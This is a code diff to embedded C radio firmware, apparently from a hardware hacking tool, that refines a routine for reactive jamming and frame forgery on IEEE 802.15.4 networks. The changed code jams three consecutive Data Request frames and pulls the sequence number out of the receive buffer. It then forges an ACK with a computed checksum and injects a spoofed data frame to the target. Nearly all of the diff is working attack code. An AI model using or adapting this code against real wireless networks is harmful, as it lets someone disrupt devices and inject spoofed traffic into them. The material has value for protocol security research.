@@ -530,17 +530,31 @@ void ccspi_handle_fn( uint8_t const app,
 
   case CCSPI_REFLEX_INDIRECT:
 #if defined(FIFOP) && defined(SFD) && defined(FIFO) && defined(PLED2DIR) && defined(PLED2PIN) && defined(PLED2OUT)
+//The SPI transactions required to initiate a jam, read the sequence number, and transmit a well-formed
+//  ACK take longer than the 864us ACK timeout specified by 802.15.4.  To get around this, this block
+//  pipelines the jamming process to take advantage of protocol retries.  Three Data Request frames are
+//  jammed, with SPI transactions interspersed between them.
+//  Data Request 0: Jammed by a generic jamming frame after seqnum is populated in RXFIFO.
+//  Data Request 1: Jammed by a generic jamming frame.
+//                  RXFIFO is read back to extract seqnum.
+//                  ACK is composed using extracted SEQNUM.
+//  Data Request 2: Jammed using the ACK frame composed following Data Request 1.
+//                  ACK frame is retransmitted to serve its intended purpose.
+//                  TXFIFO is flushed, payload is delivered.
+//                  TXFIFO and RXFIFO are flushed, and the process repeats.
+//  Note: This requires at least three protocol retries sent by the target.
+//        May take a few attempts to properly align within the retry sequences.
     debugstr("Indirect data forging until reset.");
     debugstr("Preloaded response:");
     for(i=0;i<cmddata[0]+1;i++) {
         itoa(cmddata[i], byte, 16);
         debugstr(byte);
     }
-//    txdata(app, verb, len);
+    txdata(app, verb, len);
     while(1) {
         #define INDBUFLEN 10
         char pktbuf[INDBUFLEN];
-        char rxfcf0;
+        //char rxfcf0;
         //Has there been an overflow in the RX buffer?
         if((!FIFO)&&FIFOP){
           //debugstr("Clearing overflow");
@@ -550,68 +564,70 @@ void ccspi_handle_fn( uint8_t const app,
         }
 
         //Preload jamming sequence
-        pktbuf[0] = 0x07;
+        pktbuf[0] = 0x04;
         pktbuf[1] = 0x01;
         pktbuf[2] = 0x08;
         pktbuf[3] = 0xff;
         pktbuf[4] = 0xff;
-        pktbuf[5] = 0xff;
-        pktbuf[6] = 0xff;
+//        pktbuf[5] = 0xff;
+//        pktbuf[6] = 0xff;
 
+        //LED 1 (yellow)
+	PLEDDIR |= PLEDPIN;
+	PLEDOUT |= PLEDPIN;
+
+        CLRSS;
+        ccspitrans8(0x09);  //SFLUSHTX
+        SETSS;
+
+//DATA REQ 0
         //Wait until a packet is received
         while(!SFD);
         //Turn on LED 2 (green) as signal
 	    PLED2DIR |= PLED2PIN;
 	    PLED2OUT &= ~PLED2PIN;
 
-        //Put radio in TX mode
-        //Note: Not doing this slows down jamming, so can't jam short packets.
-        //      However, if we do this, it seems to mess up our RXFIFO ability.
-        //CLRSS;
-        //ccspitrans8(0x04);
-        //SETSS;
-
         //Load the jamming packet
         CLRSS;
         ccspitrans8(CCSPI_TXFIFO);
-        for(i=0;i<pktbuf[0];i++)
+        for(i=0;i<pktbuf[0]+1;i++)
           ccspitrans8(pktbuf[i]);
         SETSS;
+
         //Transmit the jamming packet
         CLRSS;
         ccspitrans8(0x04);  //STXON
         SETSS;
+
         while(!SFD);        // Wait for TX to complete
         while(SFD);
-
-        // SPI transactions may be just right amount of delay for the ACK...
-        // (1/115200)* 8+1+1 * (4 RXFIFO + 5 TXFIFO) = ~780us, vs 864us ACK timeout
-        //msdelay(1);
-        //delay_us(400);  // wait to prep ack. data rate 32us/byte, jam kicks in around ~7th byte of 12 byte long MPDU
-        //Flush TX buffer.
+        
+// DATA REQ 1
+        //Wait for SFD to be received
+        while(!SFD);
+        //Jam using the same sequence used to jam DATA REQ 0
         CLRSS;
-        ccspitrans8(0x09);  //SFLUSHTX
+        ccspitrans8(0x04);  //STXON
         SETSS;
+        while(!SFD);
+        while(SFD);  // Wait for TX to complete
 
-        //Get the beginning of the jammed packet -- seqnum required to forge ACK
+        //Get the beginning of jammed DATA REQ 0 -- seqnum required to forge ACK
         CLRSS;
         ccspitrans8(CCSPI_RXFIFO | 0x40);
         for(i=0;(i<4) && (i<INDBUFLEN);i++)  // MAGIC seqnum is byte 4/index 3 in RXFIFO
             pktbuf[i]=ccspitrans8(0xde);
         SETSS;
-        //Flush RX buffer.
-        CLRSS;
-        ccspitrans8(0x08);  //SFLUSHRX
-        SETSS;
 
         //save part of FCF, later will use 0x1X frame pending flag to determine whether to send
-        rxfcf0 = pktbuf[1];
+        //rxfcf0 = pktbuf[1];
 
         //Create the forged ACK packet
         pktbuf[0] = 5;     //length of ack frame, omitting length
         pktbuf[1] = 0x12;  //first byte of FCF -- 0x1X is frame pending flag
         pktbuf[2] = 0x00;  //second byte of FCF
         //[3] is already filled with the sequence number
+        //Compute FCS: CRC16 KERMIT
         long crc = 0;
         for(i=1;i<4;i++) {
             char c = pktbuf[i];
@@ -623,21 +639,36 @@ void ccspi_handle_fn( uint8_t const app,
         pktbuf[4] = crc & 0xFF;
         pktbuf[5] = (crc >> 8) & 0xFF;
 
+        //Flush TX buffer
+        CLRSS;
+        ccspitrans8(0x09);
+        SETSS;
+
+// DATA REQ 2
+        //Wait for SFD to be received
+        while(!SFD);
+
         //Load the forged ACK packet
         CLRSS;
         ccspitrans8(CCSPI_TXFIFO);
         for(i=0;(i<pktbuf[0]+1) && (i<INDBUFLEN);i++)      // Send extras
           ccspitrans8(pktbuf[i]);
         SETSS;
-        //Transmit the forged ACK packet
-        while(SFD);
+        //Jam the incoming data request frame using the forged ACK packet
         CLRSS;
         ccspitrans8(0x04);  //STXON
         SETSS;
-        while(!SFD);        // Wait for TX to complete
-        while(SFD);
-        msdelay(100);       // MAGIC arbitrary delay before response frame: TODO shorten appropriately
-        //msdelay(1000);
+        while(!SFD);
+        while(SFD);         // wait for jam to fire
+
+        //Fire the ACK to acknowledge the Data Request sequence
+        CLRSS;
+        ccspitrans8(0x04);  //STXON
+        SETSS;
+        while(!SFD);
+        while(SFD);         // wait for ACK to fire
+
+        msdelay(1);       // MAGIC arbitrary delay before response frame: shorten appropriately
         //Flush TX buffer
         CLRSS;
         ccspitrans8(0x09);  //SFLUSHTX
@@ -647,31 +678,30 @@ void ccspi_handle_fn( uint8_t const app,
 	PLEDDIR |= PLEDPIN;
 	PLEDOUT &= ~PLEDPIN;
 
-        //msdelay(1000);
-
-        //Load the forged indirect response packet
+        //Load the forged indirect response payload frame
         CLRSS;
         ccspitrans8(CCSPI_TXFIFO);
-        for(i=0;i<cmddata[0]+4;i++)  // Sending a few extra, otherwise the FCS gets garbled...
+        for(i=0;i<cmddata[0]+4;i++)  // Sending a few extra; sometime the FCS gets garbled
           ccspitrans8(cmddata[i]);
         SETSS;
-        //Transmit the forged indirect poll response packet
+        //Transmit the forged indirect response frame
         CLRSS;
         ccspitrans8(0x04);  //STXON
         SETSS;
-        while(!SFD);        // Wait for TX to complete
-        while(SFD);
+        while(!SFD);
+        while(SFD);         // Wait for TX to complete
         //Flush TX buffer
         CLRSS;
         ccspitrans8(0x09);  //SFLUSHTX
+        SETSS;
+        //Flush RX buffer
+        CLRSS;
+        ccspitrans8(0x08);  //SFLUSHRX
         SETSS;
 
         //Turn off LED 2 (green) as signal
 	PLED2DIR |= PLED2PIN;
 	PLED2OUT |= PLED2PIN;
-        //LED 1 (yellow)
-	PLEDDIR |= PLEDPIN;
-	PLEDOUT |= PLEDPIN;
     }
 #else
     debugstr("Can't reflexively jam without SFD, FIFO, FIFOP, and P2LEDx definitions - try using telosb platform.");
